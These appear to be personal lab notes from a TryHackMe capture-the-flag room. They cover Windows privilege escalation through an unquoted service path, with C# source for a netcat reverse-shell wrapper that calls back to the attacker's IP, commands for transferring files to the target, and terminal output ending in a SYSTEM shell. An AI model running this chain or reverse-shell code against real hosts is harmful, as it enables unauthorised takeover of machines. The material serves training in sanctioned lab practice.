+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ mcs Wrapper.cs
+                                                            
+                     
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ file Wrapper.exe 
+Wrapper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+                                                            
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ cat Wrapper.cs 
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+           Process proc = new Process();
+	   ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc64-witty.exe", "10.50.88.115 31337 -e cmd.exe");
+	   procInfo.CreateNoWindow = true;
+	   proc.StartInfo = procInfo;
+	   proc.Start();	   
+        }
+    }
+}
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+C:\xampp\htdocs\resources\uploads>curl http://10.50.88.115/Wrapper.exe -o "C:\xampp\htdocs\resources\uploads\Wrapper.exe"
+curl http://10.50.88.115/Wrapper.exe -o "C:\xampp\htdocs\resources\uploads\Wrapper.exe"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3584  100  3584    0     0   3584      0  0:00:01 --:--:--  0:00:01  9166
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ sudo python3 -m http.server 80
+[sudo] password for witty: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.87.100 - - [18/Jun/2023 15:59:49] "GET /Wrapper.exe HTTP/1.1" 200 -
+
+C:\xampp\htdocs\resources\uploads>Wrapper.exe
+Wrapper.exe
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ rlwrap nc -lvnp 31337        
+listening on [any] 31337 ...
+connect to [10.50.88.115] from (UNKNOWN) [10.200.87.100] 50205
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>
+
+C:\xampp\htdocs\resources\uploads>copy Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
+copy Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
+        1 file(s) copied.
+
+C:\xampp\htdocs\resources\uploads>dir "C:\Program Files (x86)\System Explorer\"
+dir "C:\Program Files (x86)\System Explorer\System.exe"
+ Volume in drive C has no label.
+ Volume Serial Number is A041-2802
+
+ Directory of C:\Program Files (x86)\System Explorer
+
+18/06/2023  21:07             3,584 System.exe
+               1 File(s)          3,584 bytes
+               0 Dir(s)   6,914,260,992 bytes free
+
+C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
+sc stop SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x1388
+
+C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
+sc start SystemExplorerHelpService
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ rlwrap nc -lvnp 31337
+listening on [any] 31337 ...
+connect to [10.50.88.115] from (UNKNOWN) [10.200.87.100] 50051
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>del "C:\Program Files (x86)\System Explorer\System.exe"
+del "C:\Program Files (x86)\System Explorer\System.exe"
+```
+Write and compile a wrapper program using Mono or Visual Studio.
+Question Done
+Transfer the `Wrapper.exe`  file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.
+---
+Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.
+First up, let's download the package:
+`sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .   `
+_**Note:** On the AttackBox Impacket is preinstalled at_ `/opt/impacket/impacket`
+We can now start up a temporary SMB server:
+`sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword`
+![Demonstration of what a successful Impacket SMB Server startup looks like. There should be a bunch of messages saying Config file parsed](https://assets.tryhackme.com/additional/wreath-network/99f9b77f1bf0.png)
+With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.
+Now, in our reverse shell, we can use this command to authenticate:
+`net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`
+![Demonstration of the net use command. The result should include The command completed successfully](https://assets.tryhackme.com/additional/wreath-network/9a27791867af.png)
+This authenticates with the server using the credentials we set (`user:s3cureP@ssword`). We can now copy our compiled  `Wrapper.exe` program up to the target. Due to file permissions on the normal `C:\Windows\Temp` directory, we are doing this from our current user's own `%TEMP%` directory:
+`copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe`
+![Confirmation that the copy operation was successful](https://assets.tryhackme.com/additional/wreath-network/857c1d682e0e.png)
+_**Note:** We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway._
+It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.
+That said, to prevent errors down the line, we should disconnect from it for the time being:
+`net use \\ATTACKER_IP\share /del`
+![Confirmation that the share was deleted successfully. The message should say as much](https://assets.tryhackme.com/additional/wreath-network/060e1ee4ce7c.png)
+Question Done
+Start a listener on your chosen port and try to execute the wrapper manually -- you should get a reverse shell back:
+`"%TEMP%\wrapper-USERNAME.exe"`
+![Demonstration that executing the reverse shell manually results in a reverse shell](https://assets.tryhackme.com/additional/wreath-network/ff8bafc56cb6.png)
+Completed
+Excellent. Our program works and is not getting caught by the antivirus. We are now ready to exploit that unquoted service path vulnerability!
+Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. `C:\Directory One\Directory Two\Executable.exe`) then Windows will look for the executable in the following order:
+1. `C:\Directory.exe`
+2. `C:\Directory One\Directory.exe`
+3. `C:\Directory One\Directory Two\Executable.exe   `
+What this means is that if we can create a file called `Directory.exe` in the root directory, or `C:\Directory One\`, then we can trick Windows into executing our file instead!
+Let's take a look at the actual path of our vulnerable service: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. There are technically three places we _could_ add our program here:
+- We could put it in the root directory and call it `Program.exe`. This is _very_ unlikely to work, as the chances of having write permissions here are virtually 0.
+- We could put it in the `C:\Program Files (x86)\` directory and call it `System.exe`. Once again, this is unlikely to work because the chances of being able to write into `C:\Program Files (x86)\` are minimal.
+- We could put it in `C:\Program Files (x86)\System Explorer\` and call it `System.exe`. This one will work! Remember we checked the permissions of this directory in the last task and found that we had full access? This means that we can place our wrapper into this directory, then when the service is restarted, our wrapper will be executed giving us a shell as the local system user!
+Before blindly copying your wrapper, check to make sure that another user isn't currently performing this exploit:
+`dir "C:\Program Files (x86)\System Explorer\"`
+If you see a file called `System.exe` in the output then _please wait a few minutes until it disappears._
+If there is not already an exploit in the directory then it's time to root this thing!
+Copy your wrapper from `C:\Windows\Temp\wrapper-USERNAME.exe` to `C:\Program Files (x86)\System Explorer\System.exe`.
+`copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"`
+![Copying the wrapper into place. It should appear under C:\Program Files (x86)\System Explorer\System.exe](https://assets.tryhackme.com/additional/wreath-network/7faedc9a86ab.png)
+_**Note:** There is a cleanup script running on this target once every five minutes in case any hackers are too sloppy to cover up their tracks by restoring the service to working order. If your payload disappears before execution then you may have been caught by the script. If this happens, just repeat this step and the exploit should work._
+Completed
+Our exploit is in place! We have two options to activate it:
+- This service starts automatically at boot, so we could try restarting the entire box (although we don't actually have the required permissions to do this to prevent users from taking the box down).
+- We could try restarting the service itself. Given the amount of access to this service that Thomas has given to his account, it's a fair bet that we might be able to do this.
+Failing either of these, we would be stuck waiting for someone to restart the target for us naturally.
+Let's try stopping the service:
+`sc stop SystemExplorerHelpService`
+![Demonstration of stopping the service. There should be a STOP_PENDING message](https://assets.tryhackme.com/additional/wreath-network/adffd8978a57.png)
+We can stop the service, so chances are we can also start it! Set up a listener on your attacking machine then start the service:
+`sc start SystemExplorerHelpService`
+![Starting the service again. It should error out with a message about not starting in a timely fashion](https://assets.tryhackme.com/additional/wreath-network/210940d0f105.png)
+We have root!
+Notice that we got a message telling us that the service failed to start. This is because the wrapper we uploaded isn't actually a real Windows service file. Our executable still gets executed, but as far as Windows is concerned, the service failed to start.
+Completed
+There's only one thing left to do here.
+Let's clear up after ourselves by deleting the wrapper and starting the service:
+`del "C:\Program Files (x86)\System Explorer\System.exe"   sc start SystemExplorerHelpService`
+![Demonstration of the correct output from deleting the binary and starting the service normally](https://assets.tryhackme.com/additional/wreath-network/da5255d9443c.png)
+Clearing up after exploits is a good habit to get into. This also has the added bonus of being courteous to other users in the box who may be about to perform the exploit. Note that deleting the wrapper and restarting the service did not destroy the system shell!
+Completed
+**Bonus Question (optional):** Research how to write a real Windows Service executable in C# and try to create a wrapper (or even a full reverse shell!) that doesn't cause the `sc start` command to error out.
+The code [here](https://github.com/mattymcfatty/unquotedPoC) may help (but please do not run this as-is because it will create a new user with a known password):
+Completed
+
+## Flags / Answers
+- Each local account on the target is shown here, in a format of Username, RID, LM hash, NT hash -- separated by colons. We are interested in the _NT_ hashes -- the last section (blurred). As a side note: `31d6cfe0d16ae931b73c59d7e0c089c0` is an empty hash, and indicates that the account is not activated. These can thus be discounted.
+
+## Notes / Lessons Learned
+[[1] TryHackme: What The Shell?](https://tryhackme.com/room/introtoshells)
+[[CCT2019]]
+
